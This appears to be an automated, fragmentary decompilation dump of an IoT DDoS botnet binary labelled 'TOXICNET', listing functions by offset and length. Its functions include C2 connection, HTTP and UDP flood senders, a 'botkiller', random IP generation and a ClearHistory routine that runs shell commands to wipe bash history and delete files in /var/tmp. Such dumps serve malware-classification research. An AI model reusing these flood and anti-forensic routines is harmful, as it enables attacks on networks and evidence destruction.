                                            while (true) {
                                while (true) {
                                    if (fgets(v150, 128, v154) == 0) {
                                free();
                                    free();
                                while (true) {
                if (fgets(v150, 128, v154) == 0) {
            if (fgets(v150, 128, v154) == 0) {
    __GI_fclose((char *)v154);
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 17620
++++++++ FUNCTION END 17916
++++++++ FUNCTION LENGTH 296
    int32_t v152 = socket(); // 0x11a48
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v152, (struct sockaddr *)&v153, 16) == -1) {
    int32_t v156 = __GI_getsockname(v152, (struct sockaddr *)&v155, (int32_t)&v154, (int32_t)&v155, 16); // 0x11b28
        int32_t v157 = __libc_open("/proc/net/route", 0); // 0x11b64
        while (true) {
            if (fdgets(v159, 0x1000, v157, v159) != 0) {
                if (strstr(v159, "\t00000000\t") != 0) {
                        __libc_close(v157);
                            __libc_close(v152);
                        __libc_close(v152);
                    __libc_close(v157);
                        __libc_close(v152);
                    __libc_close(v152);
            __libc_close(v157);
                __libc_close(v152);
            __libc_close(v152);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 26884
++++++++ FUNCTION END 27907
++++++++ FUNCTION LENGTH 1023
                if (__libc_open((char *)v154, v159) < 0) {
                        free();
                            free();
                    free();
                if (__libc_open((char *)v154, v159) < 0) {
                        free();
                            free();
                    free();
                    free();
        if (__libc_open((char *)v154, v159) < 0) {
                free();
            free();
                free();
=================FUNCTION : print ===================
++++++++ FUNCTION START 3061
++++++++ FUNCTION END 3502
++++++++ FUNCTION LENGTH 441
    while (true) {
                    printchar(a1, (int32_t)*v155);
                        while (true) {
                            while (true) {
                                int32_t v178 = prints(v152, v175, v166, v160, (int32_t)&v177); // 0x8a5c
                                    int32_t v180 = printi(v152, v179, 10, 1, v166, v160, 97) + result; // 0x8acc
                                        int32_t v182 = printi(v152, v181, 16, 0, v166, v160, 97) + result; // 0x8b30
                                            int32_t v184 = printi(v152, v183, 16, 0, v166, v160, 65) + result; // 0x8b94
                                                int32_t v187 = printi(v152, v186, 10, 0, v166, v160, 97) + result; // 0x8bf8
                                                    int32_t v190 = prints(v152, (char *)&v154, v166, v160, v188); // 0x8c4c
            printchar(a1, (int32_t)*v155);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5574
++++++++ FUNCTION END 5795
++++++++ FUNCTION LENGTH 221
    int32_t v152 = __libc_open("/proc/cpuinfo", 0); // 0x9608
    while (true) {
        if (fdgets(v154, 0x1000, v152, v154) == 0) {
            __libc_close(v152);
        uppercase((char *)&v153);
        if (strstr(v154, "BOGOMIPS") == v154) {
            while (true) {
                            while (true) {
                                        __libc_close(v152);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 66570
++++++++ FUNCTION END 67061
++++++++ FUNCTION LENGTH 491
        return inet_ntop4(a2, a3, a4);
        while (true) {
                while (true) {
                            while (true) {
                                                    if (inet_ntop4(a2 + 12, v180, v153 - v180 - 32) == 0) {
                                            v186 = sprintf(v180, (int32_t)"%x", v184, v185, (int32_t)&v187, (int32_t)&v187);
                                        if (inet_ntop4(a2 + 12, v180, v153 - v180 - 32) == 0) {
                                v186 = sprintf(v180, (int32_t)"%x", v184, v185, (int32_t)&v187, (int32_t)&v187);
                while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 48033
++++++++ FUNCTION END 48425
++++++++ FUNCTION LENGTH 392
        v163 = getuid();
        v164 = geteuid();
            v166 = getgid(v164);
            if (v166 == getegid()) {
    while (true) {
    v163 = getuid();
    v164 = geteuid();
        v166 = getgid(v164);
        if (v166 == getegid()) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 2792
++++++++ FUNCTION END 3058
++++++++ FUNCTION LENGTH 266
        result2 = prints(a1, (char *)&v152, a5, a6, 0);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v156, a5 - 1, a6, (int32_t)&v159);
            result = prints(a1, v157, a5, a6, (int32_t)&v159);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v156, a5 - 1, a6, (int32_t)&v159);
        result2 = prints(a1, v157, a5, a6, (int32_t)&v159);
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 13567
++++++++ FUNCTION END 13769
++++++++ FUNCTION LENGTH 202
    random();
    random();
    int32_t result = sprintf(v153, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v154, v155); // 0x104c4
    while (true) {
        if (__libc_fork() != 0) {
    while (true) {
        v157 = socket_connect(a1, a3, (int32_t)a3);
    __libc_close(v157);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 8305
++++++++ FUNCTION END 8532
++++++++ FUNCTION LENGTH 227
        __libc_send(a1, (int32_t *)&v154, 1, 0x4000);
                __libc_send(a1, (int32_t *)&v154, 1, 0x4000);
                __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
            __libc_send(a1, (int32_t *)&v154, 1, 0x4000);
            __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
        __libc_send(a1, (int32_t *)&v154, 1, 0x4000);
        __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 41951
++++++++ FUNCTION END 42278
++++++++ FUNCTION LENGTH 327
        free();
                __heap_free((int32_t *)&v152, v162 + v156, v155 - v162);
                free();
                __heap_free((int32_t *)&v152, v162 + v156, v155 - v162);
                free();
            __heap_free((int32_t *)&v152, v162 + v156, v155 - v162);
            free();
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12246
++++++++ FUNCTION END 12438
++++++++ FUNCTION LENGTH 192
    int32_t v152 = socket(); // 0xf29c
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v152, (int32_t *)v161, 65, 0);
            __libc_connect(v152, (struct sockaddr *)&v154, 16);
                __libc_close(v152);
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 22514
++++++++ FUNCTION END 22836
++++++++ FUNCTION LENGTH 322
            int32_t v155 = __GI_getpagesize(); // 0x12ee8
                v154 = getcwd(v153, v156);
                    free();
        v154 = getcwd(a1, a2);
            free();
        v154 = getcwd(v153, a2);
            free();
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 59540
++++++++ FUNCTION END 59857
++++++++ FUNCTION LENGTH 317
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5798
++++++++ FUNCTION END 5976
++++++++ FUNCTION LENGTH 178
    int32_t v154 = __libc_open("/proc/cpuinfo", 0); // 0x9840
    while (true) {
        if (fdgets(v153, 0x1000, v154, v153) == 0) {
            __libc_close(v154);
        uppercase((char *)&v152);
        if (strstr(v153, "BOGOMIPS") == v153) {
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4441
++++++++ FUNCTION END 4651
++++++++ FUNCTION LENGTH 210
    __libc_close(a1);
    __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v153, (int32_t)&v155);
    while (true) {
        v157 = __libc_waitpid(v158, (int32_t)&v156, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v155, 0);
    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v155, 0);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6147
++++++++ FUNCTION END 6421
++++++++ FUNCTION LENGTH 274
            while (true) {
                sockprintf(v159, (int32_t)"PING");
                while (true) {
                    if (__libc_recv(v159, (int32_t *)&v160, 1, 0, v163) != 1) {
        while (true) {
            if (__libc_recv(v159, (int32_t *)&v160, 1, 0, v163) == 1) {
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 43048
++++++++ FUNCTION END 43282
++++++++ FUNCTION LENGTH 234
        while (true) {
                                __heap_link_free_area_after();
                            __heap_link_free_area_after();
                    __heap_link_free_area();
            __heap_link_free_area();
    __heap_link_free_area();
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 60018
++++++++ FUNCTION END 60315
++++++++ FUNCTION LENGTH 297
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : sendHTTP2 ===================
++++++++ FUNCTION START 13772
++++++++ FUNCTION END 13982
++++++++ FUNCTION LENGTH 210
    while (true) {
        random();
        sprintf(v154, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v156);
        if (__libc_fork() != 0) {
            while (true) {
                    if (socket_connect(a2, a3, (int32_t)a3) != 0) {
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 65993
++++++++ FUNCTION END 66359
++++++++ FUNCTION LENGTH 366
        return inet_pton4(a2, a3);
                    while (true) {
        while (true) {
                    if (inet_pton4((char *)v158, v156) >= 1) {
                                while (true) {
=================FUNCTION : __modsi3 ===================
++++++++ FUNCTION START 20073
++++++++ FUNCTION END 20690
++++++++ FUNCTION LENGTH 617
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 29182
++++++++ FUNCTION END 30093
++++++++ FUNCTION LENGTH 911
    while (true) {
        while (true) {
                while (true) {
                                                        while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 11327
++++++++ FUNCTION END 11514
++++++++ FUNCTION LENGTH 187
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v157 = socket(); // 0xde0c
    __GI_setsockopt(v157, 6, 1, &v152, 4);
    if (__libc_connect(v157, (struct sockaddr *)&v156, 16) == -1) {
=================FUNCTION : __aeabi_idiv ===================
++++++++ FUNCTION START 69748
++++++++ FUNCTION END 70316
++++++++ FUNCTION LENGTH 568
        while (true) {
                                    while (true) {
                                        while (true) {
                    while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 8761
++++++++ FUNCTION END 9008
++++++++ FUNCTION LENGTH 247
    while (true) {
        int32_t v158 = __libc_recv(a1, (int32_t *)v157, 1, 0, v157); // 0xa904
                    if (strstr(a6, (char *)a2) == 0) {
                int32_t v159 = __libc_recv(a1, (int32_t *)(v157 + 1), 2, 0, v155); // 0xa96c
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 13985
++++++++ FUNCTION END 14154
++++++++ FUNCTION LENGTH 169
    inet_addr(a1);
        int32_t v154 = socket(); // 0x106f4
        __libc_connect(v154, (struct sockaddr *)&v153, 16);
        __libc_close(v154);
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 18846
++++++++ FUNCTION END 19358
++++++++ FUNCTION LENGTH 512
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 46799
++++++++ FUNCTION END 47051
++++++++ FUNCTION LENGTH 252
            if (__GI_sigprocmask(v153, (struct _TYPEDEF_sigset_t *)&v156, v155) == v153) {
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v154, 0);
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v154, 0);
                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v154, 0);
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 45795
++++++++ FUNCTION END 46450
++++++++ FUNCTION LENGTH 655
                while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : __umodsi3 ===================
++++++++ FUNCTION START 19518
++++++++ FUNCTION END 20070
++++++++ FUNCTION LENGTH 552
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 35652
++++++++ FUNCTION END 35954
++++++++ FUNCTION LENGTH 302
    while (true) {
    while (true) {
                while (true) {
                    while (true) {
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 32695
++++++++ FUNCTION END 32998
++++++++ FUNCTION LENGTH 303
            while (true) {
        _stdio_openlist_dec_use(v154);
        while (true) {
    _stdio_openlist_dec_use(v159);
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 7908
++++++++ FUNCTION END 8115
++++++++ FUNCTION LENGTH 207
    if (getHost(a2, &v153) != 0) {
    if (__libc_connect(a1, (struct sockaddr *)&v152, 16) >= 0) {
    getsockopt();
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 8118
++++++++ FUNCTION END 8302
++++++++ FUNCTION LENGTH 184
    int32_t result = __libc_fork(); // 0xa34c
    while (true) {
                free();
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 30476
++++++++ FUNCTION END 30806
++++++++ FUNCTION LENGTH 330
            while (true) {
                                    case 256: {
                                    case 512: {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 35043
++++++++ FUNCTION END 35303
++++++++ FUNCTION LENGTH 260
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 35306
++++++++ FUNCTION END 35649
++++++++ FUNCTION LENGTH 343
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 3818
++++++++ FUNCTION END 3980
++++++++ FUNCTION LENGTH 162
    print(&v153, a2, (int32_t)&v154);
    int32_t result = __libc_send(a1, (int32_t *)v152, strlen(str), 0x4000); // 0x8df8
    free();
=================FUNCTION : trim ===================
++++++++ FUNCTION START 1824
++++++++ FUNCTION END 2038
++++++++ FUNCTION LENGTH 214
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 13231
++++++++ FUNCTION END 13405
++++++++ FUNCTION LENGTH 174
    while (true) {
            __libc_system(v152);
            __libc_system(v152);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 51149
++++++++ FUNCTION END 51492
++++++++ FUNCTION LENGTH 343
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 17430
++++++++ FUNCTION END 17617
++++++++ FUNCTION LENGTH 187
        __libc_close(v153);
    int32_t v160 = socket(); // 0x119a8
    return connectTimeout(v160, v151, v158, 30) == 0;
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 13408
++++++++ FUNCTION END 13564
++++++++ FUNCTION LENGTH 156
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 52659
++++++++ FUNCTION END 52934
++++++++ FUNCTION LENGTH 275
            while (true) {
    while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 45280
++++++++ FUNCTION END 45478
++++++++ FUNCTION LENGTH 198
    int32_t v155 = __vfork(); // 0x16a14
        int32_t v156 = wait4(); // 0x16abc
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 36115
++++++++ FUNCTION END 36401
++++++++ FUNCTION LENGTH 286
            while (true) {
                while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 60499
++++++++ FUNCTION END 60695
++++++++ FUNCTION LENGTH 196
    while (true) {
        while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 62789
++++++++ FUNCTION END 62944
++++++++ FUNCTION LENGTH 155
    __libc_getpid();
    return kill();
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 21175
++++++++ FUNCTION END 21342
++++++++ FUNCTION LENGTH 167
    int32_t result = vfork(); // 0x12cf0
        int32_t result2 = fork(); // 0x12d08
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 26187
++++++++ FUNCTION END 26386
++++++++ FUNCTION LENGTH 199
    if (__libc_close(v152) < 0) {
    _stdio_openlist_dec_use(__pthread_return_void());
=================FUNCTION : __GI_memset ===================
++++++++ FUNCTION START 33983
++++++++ FUNCTION END 34263
++++++++ FUNCTION LENGTH 280
        while (true) {
        while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 45056
++++++++ FUNCTION END 45277
++++++++ FUNCTION LENGTH 221
        srandom_r((int32_t *)a1, a4);
    srandom_r((int32_t *)a1, a4);
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 60698
++++++++ FUNCTION END 60947
++++++++ FUNCTION LENGTH 249
    while (true) {
        while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 69301
++++++++ FUNCTION END 69559
++++++++ FUNCTION LENGTH 258
        while (true) {
            while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 8535
++++++++ FUNCTION END 8758
++++++++ FUNCTION LENGTH 223
    while (true) {
                while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 44675
++++++++ FUNCTION END 44880
++++++++ FUNCTION LENGTH 205
            while (true) {
                    __GI_random_r((int32_t *)(int32_t)a1, (int32_t)&v160);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 65396
++++++++ FUNCTION END 65595
++++++++ FUNCTION LENGTH 199
    while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 7725
++++++++ FUNCTION END 7905
++++++++ FUNCTION LENGTH 180
    while (true) {
            if (strcasestr((char *)a1, v155, 4 * v154) != 0) {
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 36606
++++++++ FUNCTION END 36815
++++++++ FUNCTION LENGTH 209
    while (true) {
        while (true) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 67901
++++++++ FUNCTION END 68061
++++++++ FUNCTION LENGTH 160
    int32_t result = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v151); // 0x1a6c0
        return __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v151);
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 33001
++++++++ FUNCTION END 33274
++++++++ FUNCTION LENGTH 273
            while (true) {
                if ((char)getc_unlocked((char *)a3) == -1) {
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 25017
++++++++ FUNCTION END 25212
++++++++ FUNCTION LENGTH 195
        v152 = sigprocmask(how, set, oset);
    v152 = sigprocmask(how, set, oset);
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 51495
++++++++ FUNCTION END 51735
++++++++ FUNCTION LENGTH 240
    while (true) {
            while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 34625
++++++++ FUNCTION END 34870
++++++++ FUNCTION LENGTH 245
    while (true) {
            while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 11004
++++++++ FUNCTION END 11160
++++++++ FUNCTION LENGTH 156
    return rand_cmwc();
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 38125
++++++++ FUNCTION END 38285
++++++++ FUNCTION LENGTH 160
    int32_t result = __GI_inet_ntoa_r(); // 0x1571c
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 39975
++++++++ FUNCTION END 40139
++++++++ FUNCTION LENGTH 164
    int32_t v152 = sendto(sock, message, length, flags, NULL, 0); // 0x15bec
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 65757
++++++++ FUNCTION END 65990
++++++++ FUNCTION LENGTH 233
    while (true) {
=================FUNCTION : _promoted_size ===================
++++++++ FUNCTION START 30809
++++++++ FUNCTION END 30986
++++++++ FUNCTION LENGTH 177
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 32127
++++++++ FUNCTION END 32295
++++++++ FUNCTION LENGTH 168
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // 0x148f0
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 40142
++++++++ FUNCTION END 40306
++++++++ FUNCTION LENGTH 164
    int32_t v152 = setsockopt(sock, level, option_name, option_value, 0); // 0x15c1c
=================FUNCTION : rand ===================
++++++++ FUNCTION START 43510
++++++++ FUNCTION END 43664
++++++++ FUNCTION LENGTH 154
    return random();
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 6424
++++++++ FUNCTION END 6579
++++++++ FUNCTION LENGTH 155
    return __GI_inet_ntoa(v152);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 23167
++++++++ FUNCTION END 23331
++++++++ FUNCTION LENGTH 164
    int32_t pid = getpid(); // 0x12fd8
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5239
++++++++ FUNCTION END 5394
++++++++ FUNCTION LENGTH 155
    int32_t v152 = inet_addr(a1); // 0x9540
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 22839
++++++++ FUNCTION END 23000
++++++++ FUNCTION LENGTH 161
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : kill ===================
++++++++ FUNCTION START 23670
++++++++ FUNCTION END 23834
++++++++ FUNCTION LENGTH 164
    int32_t v152 = kill(); // 0x13080
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 36404
++++++++ FUNCTION END 36603
++++++++ FUNCTION LENGTH 199
    while (true) {
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 42281
++++++++ FUNCTION END 42495
++++++++ FUNCTION LENGTH 214
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 39641
++++++++ FUNCTION END 39805
++++++++ FUNCTION LENGTH 164
    int32_t v152 = recv(sock, buf, length, flags); // 0x15b8c
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 69562
++++++++ FUNCTION END 69745
++++++++ FUNCTION LENGTH 183
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 26546
++++++++ FUNCTION END 26700
++++++++ FUNCTION LENGTH 154
    return __GI_vsnprintf();
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 32469
++++++++ FUNCTION END 32692
++++++++ FUNCTION LENGTH 223
            while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 6748
++++++++ FUNCTION END 6924
++++++++ FUNCTION LENGTH 176
        result = __libc_recv(a1, (int32_t *)a3, a4, 0, (int32_t)&v157);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 10841
++++++++ FUNCTION END 11001
++++++++ FUNCTION LENGTH 160
    free();
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 65154
++++++++ FUNCTION END 65393
++++++++ FUNCTION LENGTH 239
    while (true) {
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 62632
++++++++ FUNCTION END 62786
++++++++ FUNCTION LENGTH 154
    return __read_etc_hosts_r();
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3662
++++++++ FUNCTION END 3815
++++++++ FUNCTION LENGTH 153
    return print(&a1, a2, (int32_t)&a3);
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 34266
++++++++ FUNCTION END 34444
++++++++ FUNCTION LENGTH 178
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 69051
++++++++ FUNCTION END 69298
++++++++ FUNCTION LENGTH 247
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 4836
++++++++ FUNCTION END 5015
++++++++ FUNCTION LENGTH 179
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 5979
++++++++ FUNCTION END 6144
++++++++ FUNCTION LENGTH 165
            v152 = rand_cmwc() % 26;
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 36981
++++++++ FUNCTION END 37144
++++++++ FUNCTION LENGTH 163
    uint32_t v152 = __GI_tcgetattr(); // 0x155a8
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 28773
++++++++ FUNCTION END 28953
++++++++ FUNCTION LENGTH 180
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 42498
++++++++ FUNCTION END 42711
++++++++ FUNCTION LENGTH 213
    while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 28404
++++++++ FUNCTION END 28600
++++++++ FUNCTION LENGTH 196
        while (true) {
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 38453
++++++++ FUNCTION END 38609
++++++++ FUNCTION LENGTH 156
    gethostbyname_r(a1, &v152, (int32_t)&v151, 460, (int32_t)&result, v150);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 41480
++++++++ FUNCTION END 41727
++++++++ FUNCTION LENGTH 247
    __heap_free((int32_t *)&v152, 0x1000000 * v157 / 0x1000000, v155);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 37944
++++++++ FUNCTION END 38122
++++++++ FUNCTION LENGTH 178
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 39808
++++++++ FUNCTION END 39972
++++++++ FUNCTION LENGTH 164
    int32_t v152 = send(sock, buf, length, flags); // 0x15bb8
=================FUNCTION : srand ===================
++++++++ FUNCTION START 44151
++++++++ FUNCTION END 44308
++++++++ FUNCTION LENGTH 157
    srandom_r((int32_t *)a1, (int32_t)&v151);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 11163
++++++++ FUNCTION END 11324
++++++++ FUNCTION LENGTH 161
        __libc_close(a1);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 39140
++++++++ FUNCTION END 39304
++++++++ FUNCTION LENGTH 164
    int32_t v152 = connect(sock, addr, addr_len); // 0x15b04
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3505
++++++++ FUNCTION END 3659
++++++++ FUNCTION LENGTH 154
    return print(NULL, a1, (int32_t)&v152);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 39474
++++++++ FUNCTION END 39638
++++++++ FUNCTION LENGTH 164
    int32_t v152 = getsockopt(); // 0x15b60
=================FUNCTION : random ===================
++++++++ FUNCTION START 43667
++++++++ FUNCTION END 43826
++++++++ FUNCTION LENGTH 159
    __GI_random_r((int32_t *)0x26768, (int32_t)&result);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 47696
++++++++ FUNCTION END 47866
++++++++ FUNCTION LENGTH 170
    int32_t result2 = __libc_open("/dev/null", a2); // 0x17064
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 24009
++++++++ FUNCTION END 24173
++++++++ FUNCTION LENGTH 164
    int32_t v153 = __libc_open((char *)v152, 577); // 0x1310c
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 10419
++++++++ FUNCTION END 10574
++++++++ FUNCTION LENGTH 155
    return rand_cmwc() & -1 - a1 ^ v152 & a1;
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 50481
++++++++ FUNCTION END 50645
++++++++ FUNCTION LENGTH 164
    int32_t v152 = wait4(); // 0x175b8
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 22347
++++++++ FUNCTION END 22511
++++++++ FUNCTION LENGTH 164
    int32_t v152 = fork(); // 0x12e94
=================FUNCTION : csum ===================
++++++++ FUNCTION START 10577
++++++++ FUNCTION END 10838
++++++++ FUNCTION LENGTH 261
    while (true) {
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 38288
++++++++ FUNCTION END 38450
++++++++ FUNCTION LENGTH 162
    if (inet_aton((char *)v152, (int32_t)&result) != 0) {
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 23837
++++++++ FUNCTION END 24006
++++++++ FUNCTION LENGTH 169
    int32_t fd = open(path, oflag); // 0x130d0
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 39307
++++++++ FUNCTION END 39471
++++++++ FUNCTION LENGTH 164
    int32_t v152 = getsockname(sock, addr, (int32_t *)addr_len); // 0x15b30
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 26389
++++++++ FUNCTION END 26543
++++++++ FUNCTION LENGTH 154
    return _stdio_fopen();
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 64950
++++++++ FUNCTION END 65151
++++++++ FUNCTION LENGTH 201
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 43285
++++++++ FUNCTION END 43507
++++++++ FUNCTION LENGTH 222
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4654
++++++++ FUNCTION END 4833
++++++++ FUNCTION LENGTH 179
    while (true) {
=================FUNCTION : getBuild ===================
++++++++ FUNCTION START 17919
++++++++ FUNCTION END 18073
++++++++ FUNCTION LENGTH 154
    return (int32_t)"TOXICNET";
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 6927
++++++++ FUNCTION END 7088
++++++++ FUNCTION LENGTH 161
        __libc_close(*a1);
=================FUNCTION : socket ===================
++++++++ FUNCTION START 40309
++++++++ FUNCTION END 40473
++++++++ FUNCTION LENGTH 164
    int32_t v152 = socket(); // 0x15c48
=================FUNCTION : free ===================
++++++++ FUNCTION START 41730
++++++++ FUNCTION END 41948
++++++++ FUNCTION LENGTH 218
    v150 = __heap_free((int32_t *)&v155, v154 - 4, v156);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 66362
++++++++ FUNCTION END 66567
++++++++ FUNCTION LENGTH 205
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 25382
++++++++ FUNCTION END 25536
++++++++ FUNCTION LENGTH 154
    return wait4();
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 26703
++++++++ FUNCTION END 26881
++++++++ FUNCTION LENGTH 178
    int32_t result = _vfprintf_internal(v153, (char *)v160, v161, v159, v154, v159, v154, v154, v154, v159, v157); // 0x13540
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 22013
++++++++ FUNCTION END 22177
